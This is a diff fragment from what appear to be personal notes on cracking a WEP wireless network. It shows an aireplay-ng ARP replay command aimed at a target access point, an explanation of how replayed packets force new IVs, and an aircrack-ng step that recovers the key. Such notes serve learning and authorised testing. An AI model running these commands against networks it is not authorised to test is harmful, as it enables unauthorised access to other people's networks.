@@ -10,3 +10,7 @@
             This will force the AP to communicate with me. I am not connected at this point, I am just communicating with it.   
             Now we run an ARP attack 
             sudo aireplay-ng --arpreplay -b {target network MAC}  -h [my usb adapter MAC] [interface ID of USB adapter] 
+            My wireless adapter waits for an ARP packet capture it and retransmit it. The the AP will be forced to generate a new packet with a new IV. This will force the AP to continue to generate new packets with new IV's.  
+            Then I can aircrack it 
+            aircrack-ng [filename .cap] 
+            KEY FOUND [ PWD remove colons] 
